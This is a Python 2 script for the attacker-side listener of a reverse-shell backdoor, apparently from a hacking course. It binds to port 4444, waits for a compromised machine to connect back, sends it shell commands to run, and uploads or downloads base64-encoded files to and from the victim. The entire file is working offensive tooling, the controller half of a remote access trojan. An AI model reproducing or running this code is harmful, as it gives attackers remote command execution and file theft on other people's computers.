#!/usr/bin/env python

import socket, json, base64

class Listener:

    def __init__(self, ip, port):
        
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Listening for connections in port 4444")
        self.connection,addr = listener.accept()
        print("[+] Incoming connection from " + str(addr))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful.\n"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            #raw_input for python 2, input ofr python 3
            command = raw_input(">> ")
            command = command.split(" ")
            result = ""
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download":
                    self.write_file(command[1], result)
            except Exception:
                result = "[-] Error in command execution...\n"

            print(result)
            
        self.connection.close()


my_listener = Listener("192.168.1.2",4444)
my_listener.run()